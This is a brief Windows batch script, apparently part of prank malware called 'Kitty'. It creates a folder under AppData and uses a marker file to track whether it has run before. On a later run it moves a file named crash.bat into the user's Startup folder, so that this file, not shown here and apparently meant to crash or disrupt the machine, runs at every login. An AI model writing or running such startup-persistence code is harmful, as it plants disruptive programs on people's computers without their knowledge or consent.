md "%AppData%\Kitty"

if exist %AppData%\Kitty\kitty.txt (
move "%AppData%\Kitty\Files\crash.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
xcopy /s "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\crash.bat" "%AppData%\Kitty\Files"
) else ( 
echo.1>>"%AppData%\Kitty\kitty.txt")

